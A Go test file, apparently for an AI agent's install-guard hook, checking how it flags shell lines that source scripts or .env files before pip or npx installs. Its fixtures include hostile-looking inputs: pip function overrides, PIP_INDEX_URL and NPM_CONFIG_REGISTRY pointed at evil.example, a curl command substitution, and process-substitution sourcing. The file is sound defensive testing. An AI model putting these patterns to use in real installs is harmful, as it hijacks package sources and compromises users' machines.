//go:build unix

package main

import (
	"github.com/alalanet/alalanet-agent/internal/installread"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
)

// ADR-0159 round 20 (P2-I, the coordinator's decision): a file a line that installs sources (source FILE, . FILE) is
// read on the machine, within the requirements files' bounds, and is silent only when it is byte for byte a known
// virtual environment's activate script (activateTemplate, REPO-POL-NPMRC's matcher); any other file holds, and so does
// one that cannot be read or placed. Placeholders only: zz-pkg, evil.example.
func TestSourcedFileActivateSilent(t *testing.T) {
	for _, tmpl := range []string{"uv-0.13.7", "uv-0.13.7-prompt", "uv-0.13.7-relocatable", "cpython-3.12.14", "cpython-3.9.6", "cpython-3.15.2"} {
		cwd, home := t.TempDir(), t.TempDir()
		templateVenv(t, cwd, tmpl)
		for _, line := range []string{
			"source .venv/bin/activate && pip install requests",
			"python3 -m venv .venv && . .venv/bin/activate && pip install requests",
			"uv venv && source .venv/bin/activate && uv sync",
			"source .venv/bin/activate && pip install -r r.txt", // no r.txt: pip fails, nothing to read
		} {
			if why := reqFileHold(cwd, home, line, emptyPATH(t)); why != "" {
				t.Errorf("%s: %q: %q", tmpl, line, why)
			}
		}
	}
}

func TestSourcedFileHolds(t *testing.T) {
	cwd, home := t.TempDir(), t.TempDir()
	venv := templateVenv(t, cwd, "uv-0.13.7")
	act := filepath.Join(venv, "bin", "activate")
	b, err := os.ReadFile(act)
	if err != nil {
		t.Fatal(err)
	}
	writeFiles(t, cwd, map[string]string{
		"evil.sh":          "pip() { command pip --index-url https://evil.example/simple \"$@\"; }\n",
		"mod/bin/activate": string(b) + "pip() { :; }\n", // a modified activate
		"big.sh":           strings.Repeat("#", maxReqFile+1),
	})
	write(t, filepath.Join(home, "evil.sh"), "pip() { :; }\n")
	for line, want := range map[string]string{
		"source ./evil.sh && pip install zz-pkg":                            "sources ./evil.sh",
		". evil.sh; pip install zz-pkg":                                     "sources evil.sh",
		"source mod/bin/activate && pip install zz-pkg":                     "no virtual environment's activate script",
		"source ~/evil.sh && pip install zz-pkg":                            "sources ~/evil.sh",
		"source \"$VENV/bin/activate\" && pip install zz-pkg":               "cannot place",
		"source ./*.sh && pip install zz-pkg":                               "cannot place",
		"source -p x evil.sh && pip install zz-pkg":                         "an option",
		"source big.sh && pip install zz-pkg":                               "is larger than alalanet-agent reads in a sourced file",
		"source .venv && pip install zz-pkg":                                "could not be read",
		"source .venv/bin/activate && source evil.sh && pip install zz-pkg": "sources evil.sh",
		"source -- ./evil.sh && pip install zz-pkg":                         "sources ./evil.sh",
		"source <(cat .env) && pip install zz-pkg":                          "sources the output of a command",
		"bash --rcfile ./evil.sh -i -c 'pip install -r r.txt'":              "defines an alias or a function",
	} {
		if why := reqFileHold(cwd, home, line, emptyPATH(t)); !strings.Contains(why, want) {
			t.Errorf("%q: %q, want %q", line, why, want)
		}
	}
	// a line that installs nothing, a file that is not there: nothing to read or to hold
	for _, line := range []string{"source ./evil.sh && ls", "source ./missing.sh && pip install zz-pkg",
		"source ./missing.sh && . && pip install zz-pkg"} { // a bare . loads nothing
		if why := reqFileHold(cwd, home, line, emptyPATH(t)); why != "" {
			t.Errorf("%q: %q", line, why)
		}
	}
	// a copy of an activate script in another venv's folder names a venv that is not its own (invariant 3)
	writeFiles(t, cwd, map[string]string{"other/bin/activate": string(b)})
	if why := reqFileHold(cwd, home, "source other/bin/activate && pip install zz-pkg", emptyPATH(t)); !strings.Contains(why, "activate script") {
		t.Errorf("another venv's script: %q", why)
	}
}

// The bounds the requirements files have: the files for one line, the bytes in all.
func TestSourcedFileBounds(t *testing.T) {
	cwd := t.TempDir()
	templateVenv(t, cwd, "uv-0.13.7")
	var b strings.Builder
	for i := range maxReqFiles + 1 {
		v := filepath.Join(cwd, "v"+strings.Repeat("x", i)) // a venv each: read, silent, and counted
		mkdir(t, filepath.Join(v, "bin"))
		write(t, filepath.Join(v, "bin", "activate"), activateFrom(t, "uv-0.13.7", v, "zz"))
		b.WriteString("source " + filepath.Base(v) + "/bin/activate; ")
	}
	if why := reqFileHold(cwd, "", b.String()+"pip install zz-pkg", emptyPATH(t)); !strings.Contains(why, "more files than") {
		t.Errorf("%d files: %q", maxReqFiles+1, why)
	}
	old := maxReqBytes
	maxReqBytes = 100
	t.Cleanup(func() { maxReqBytes = old })
	if why := reqFileHold(cwd, "", "source .venv/bin/activate && pip install zz-pkg", emptyPATH(t)); !strings.Contains(why, "larger in all") {
		t.Errorf("past the bytes: %q", why)
	}
}

// emptyPATH: a hook environment whose PATH is one empty folder, as a PATH with no file of the sourced name is.
func emptyPATH(t *testing.T) func(string) string {
	t.Helper()
	d := t.TempDir()
	return func(k string) string {
		if k == "PATH" {
			return d
		}
		return ""
	}
}

// Round 22 (P2-M): a sourced name with no slash is looked up in PATH first: the first PATH hit is read, and the current
// folder's copy too; with no PATH, or a PATH the line sets, it holds. A reason never quotes PATH.
func TestSourcedFilePATH(t *testing.T) {
	cwd, pd, other := t.TempDir(), t.TempDir(), t.TempDir()
	writeFiles(t, cwd, map[string]string{"x.sh": "A=1\n", ".env": "A=1\n", "evil.sh": "pip() { :; }\n"})
	writeFiles(t, pd, map[string]string{"x.sh": "pip() { :; }\n", "data.env": "A=1\n", "idx.env": "PIP_INDEX_URL=https://evil.example/simple\n"})
	mkdir(t, filepath.Join(other, "x.sh")) // a folder by the name: no hit
	env := func(path string) func(string) string {
		return func(k string) string {
			if k == "PATH" {
				return path
			}
			return ""
		}
	}
	sep := string(os.PathListSeparator)
	for _, c := range []struct{ line, path, want string }{
		{"source x.sh && pip install zz-pkg", other + sep + pd, "sources x.sh from PATH"},
		{". x.sh; pip install zz-pkg", pd, "no virtual environment's activate script"},
		{"source x.sh && pip install zz-pkg", other, ""},                   // the current folder's data
		{"source .env && pip install zz-pkg", other, ""},                   // no .env on PATH: as before
		{"source data.env && pip install zz-pkg", pd, ""},                  // data on PATH is read as data
		{"source idx.env && pip install zz-pkg", pd, "PIP_INDEX_URL"},      // and judged
		{"source evil.sh && pip install zz-pkg", other, "sources evil.sh"}, // the current folder's copy
		{"source .env && pip install zz-pkg", "", "no PATH to read"},
		{"source .env && pip install zz-pkg", "~/bin" + sep + other, "cannot place"},
		{"PATH=/usr/bin:/bin source .env && pip install zz-pkg", other, "the line sets PATH"},
		{"export PATH=/usr/bin; . .env; pip install zz-pkg", other, "the line sets PATH"},
		{"source ./x.sh && pip install zz-pkg", pd, ""}, // a slash: the current folder only
		{"source missing.sh && pip install zz-pkg", other, ""},
	} {
		why := reqFileHold(cwd, "", c.line, env(c.path))
		if c.want == "" && why != "" || c.want != "" && !strings.Contains(why, c.want) || strings.Contains(why, "~/bin") ||
			strings.Contains(why, pd) {
			t.Errorf("%q with PATH %q: %q, want %q", c.line, c.path, why, c.want)
		}
	}
	// a relative PATH folder is the line's folder's
	writeFiles(t, cwd, map[string]string{"rel/x.sh": "pip() { :; }\n"})
	if why := reqFileHold(cwd, "", "source x.sh && pip install zz-pkg", env("rel")); !strings.Contains(why, "no virtual environment") {
		t.Errorf("a relative PATH folder: %q", why)
	}
}

// Round 23 (P3-T, P3-U): the folders the user's login files add to PATH are looked in too (a hook started from a GUI
// does not have them), and an entry of PATH by the name that is no regular file and no folder holds.
func TestSourcedFileStartupPATH(t *testing.T) {
	cwd, home, other := t.TempDir(), t.TempDir(), t.TempDir()
	writeFiles(t, cwd, map[string]string{"x.sh": "A=1\n", ".env": "A=1\n"})
	env := func(k string) string {
		if k == "PATH" {
			return other
		}
		return ""
	}
	for files, want := range map[string]string{
		".zshrc:export PATH=\"$HOME/.local/bin:$PATH\"\n|.local/bin/x.sh:pip() { :; }\n": "x.sh from PATH",
		".bashrc:PATH=~/bin:$PATH\n|bin/x.sh:pip() { :; }\n":                             "x.sh from PATH",
		".zprofile:path=(${HOME}/zbin $path)\n|zbin/x.sh:pip() { :; }\n":                 "x.sh from PATH",
		".profile:export PATH=\"$HOME/.local/bin:$PATH\"\n|.local/bin/x.sh:A=2\n":        "", // data there
		".profile:export PATH=\"$FOO/bin:$PATH\"\n":                                      "", // a variable: not derived
		".profile:# PATH=/nowhere\n":                                                     "",
	} {
		h := t.TempDir()
		for _, f := range strings.Split(files, "|") {
			n, body, _ := strings.Cut(f, ":")
			writeFiles(t, h, map[string]string{n: body})
		}
		why := reqFileHold(cwd, h, "source x.sh && pip install zz-pkg", env)
		if want == "" && why != "" || want != "" && !strings.Contains(why, want) || strings.Contains(why, h) {
			t.Errorf("%q: %q, want %q", files, why, want)
		}
	}
	// a line with a $ unplaces ~ for its own names, never the login files' home
	writeFiles(t, home, map[string]string{".zshrc": "export PATH=\"$HOME/.local/bin:$PATH\"\n", ".local/bin/x.sh": "pip() { :; }\n"})
	if why := reqFileHold(cwd, home, "echo $X; source x.sh && pip install zz-pkg", env); !strings.Contains(why, "from PATH") {
		t.Errorf("a $ on the line: %q", why)
	}
	// a FIFO by the name on PATH holds
	if err := syscall.Mkfifo(filepath.Join(other, "x.sh"), 0o644); err != nil {
		t.Fatal(err)
	}
	if why := reqFileHold(cwd, "", "source x.sh && pip install zz-pkg", env); !strings.Contains(why, "no regular file") {
		t.Errorf("a FIFO on PATH: %q", why)
	}
}

// Round 23: a line past the readers' cap holds in the hook, whatever the server answers.
func TestHookLineCap(t *testing.T) {
	f := &fakeHook{}
	srv := f.server(t)
	long := "pip install zz-pkg # " + strings.Repeat("a", installread.MaxLineBytes)
	d, reason := codexDecision(t, runCodex(t, srv.URL, codexInputIn(t.TempDir(), long)))
	if d != "deny" || !strings.Contains(reason, "longer than alalanet-agent reads") {
		t.Errorf("%s %q", d, clip(reason))
	}
}

// Round 22 (P3-R): the venv tool's exception holds only when its folder is not there yet, or with --clear.
func TestSourcedFileVenvExisting(t *testing.T) {
	for line, want := range map[string]string{
		"python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg":               "over a folder that is there",
		"python3 -m venv --without-pip .venv && . .venv/bin/activate && pip install zz-pkg": "over a folder that is there",
		"virtualenv --no-pip .venv && . .venv/bin/activate && pip install zz-pkg":           "over a folder that is there",
		"uv venv && . .venv/bin/activate && pip install zz-pkg":                             "over a folder that is there",
		"python3 -m venv --clear .venv && . .venv/bin/activate && pip install zz-pkg":       "",
		"uv venv --clear && . .venv/bin/activate && pip install zz-pkg":                     "",
	} {
		cwd := t.TempDir()
		writeFiles(t, cwd, map[string]string{".venv/bin/pip": "#!/bin/sh\n"})
		why := reqFileHold(cwd, "", line, emptyPATH(t))
		if want == "" && why != "" || want != "" && !strings.Contains(why, want) {
			t.Errorf("%q: %q, want %q", line, why, want)
		}
		// the folder not there yet: silent
		if why := reqFileHold(t.TempDir(), "", line, emptyPATH(t)); why != "" {
			t.Errorf("%q, no folder: %q", line, why)
		}
	}
}

// Through the hook: the server answers for the packages, the agent holds on the sourced file it read.
func TestSourcedFileHook(t *testing.T) {
	dir := t.TempDir()
	templateVenv(t, dir, "cpython-3.12.14")
	writeFiles(t, dir, map[string]string{"evil.sh": "pip() { :; }\n"})
	for _, c := range []struct{ line, want, reason string }{
		{"source ./evil.sh && pip install zz-pkg", "deny", "sources ./evil.sh"},
		{"source .venv/bin/activate && pip install zz-pkg", "", ""},
	} {
		f := &fakeHook{}
		srv := f.server(t)
		d, reason := codexDecision(t, runCodex(t, srv.URL, codexInputIn(dir, c.line)))
		if d != c.want || !strings.Contains(reason, c.reason) {
			t.Errorf("%q: %s %q", c.line, d, reason)
		}
	}
}

// Round 21 (P2-J): a sourced file that is not there when the hook reads holds — the line can write it first — unless
// it is the bin/activate of a venv the line itself creates before it, with nothing that writes in between.
func TestSourcedFileMissing(t *testing.T) {
	cwd := t.TempDir()
	for line, want := range map[string]string{
		"echo 'pip() { :; }' > new.sh && . ./new.sh && pip install zz-pkg":               "defines an alias or a function",
		"source ./missing.sh && pip install zz-pkg":                                      "",
		"python3 -m venv .venv > log && . .venv/bin/activate && pip install zz-pkg":      "is not there",
		"virtualenv -p ./py .venv && . .venv/bin/activate && pip install zz-pkg":         "is not there",
		"uv venv --python ./py && . .venv/bin/activate && pip install zz-pkg":            "is not there",
		"./py -m venv .venv && . .venv/bin/activate && pip install zz-pkg":               "is not there",
		"env -C sub python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg": "is not there",
		"python3 -m venv .venv && source ./x.sh && pip install zz-pkg":                   "",
		"source a.sh && source b.sh && pip install zz-pkg":                               "is not there",
		"python3 -m venv other && . .venv/bin/activate && pip install zz-pkg":            "",
		"python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg":            "",
		"uv venv && source .venv/bin/activate && pip install zz-pkg":                     "",
		"virtualenv venv && . venv/bin/activate && pip install zz-pkg":                   "",
		"make && python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg":    "", // the venv tool rewrites activate
	} {
		why := reqFileHold(cwd, "", line, emptyPATH(t))
		if want == "" && why != "" || want != "" && !strings.Contains(why, want) {
			t.Errorf("%q: %q, want %q", line, why, want)
		}
	}
}

// Round 21 (P3-P): a sourced .env that is only data — blank lines, comments, [export ]NAME=literal — is read as the
// assignments it makes, judged as the same exports on the line are; anything else in it holds. A reason names the
// variable, never its value.
func TestSourcedDotenv(t *testing.T) {
	for body, want := range map[string]string{
		"# settings\n\nA=1\nexport B='x y'\nC=\"a b\"\nD=\n_E9=plain-value.1\n": "",
		"PIP_INDEX_URL=https://evil.example/simple\n":                           "PIP_INDEX_URL",
		"export NPM_CONFIG_REGISTRY=https://evil.example/\n":                    "NPM_CONFIG_REGISTRY",
		"PATH=./bin:/usr/bin\n":                                                 "PATH",
		"BASH_ENV=./x\n":                                                        "BASH_ENV",
		"HOME=/tmp/zz\n":                                                        "HOME",
		"CDPATH=/tmp/zz\n":                                                      "CDPATH",
		"A=$(curl https://evil.example/)\n":                                     "no virtual environment's activate script",
		"A=b c\n":                                                               "no virtual environment's activate script",
		"pip() { :; }\n":                                                        "no virtual environment's activate script",
		"A=\"$X\"\n":                                                            "no virtual environment's activate script",
		"A=1; B=2\n":                                                            "no virtual environment's activate script",
		"export A\n":                                                            "no virtual environment's activate script",
		"A='it'\"s\"\n":                                                         "no virtual environment's activate script",
		"A=1 # note\n":                                                          "no virtual environment's activate script",
		"A=\\\nB\n":                                                             "no virtual environment's activate script",
		"A=1\r\n":                                                               "no virtual environment's activate script",
		"A='\xff'\n":                                                            "no virtual environment's activate script", // not UTF-8
		"PIP_INDEX_URL=\"https://evil.example/simple\"\n": "PIP_INDEX_URL",
	} {
		cwd := t.TempDir()
		writeFiles(t, cwd, map[string]string{".env": body})
		for _, line := range []string{"source .env && pip install zz-pkg", "set -a; . ./.env; npx -y zz-pkg"} {
			why := reqFileHold(cwd, "", line, emptyPATH(t))
			if want == "" && why != "" || want != "" && !strings.Contains(why, want) || strings.Contains(why, "evil.example") {
				t.Errorf("%q with %q: %q, want %q", line, body, why, want)
			}
		}
	} // a line the readers already hold on: the file's own data adds nothing (the line's reason is the server's)
	cwd := t.TempDir()
	writeFiles(t, cwd, map[string]string{".env": "A=1\n"})
	if why := reqFileHold(cwd, "", "source .env && pip install --index-url https://evil.example/simple zz-pkg", emptyPATH(t)); why != "" {
		t.Errorf("a line held already: %q", why)
	}
}
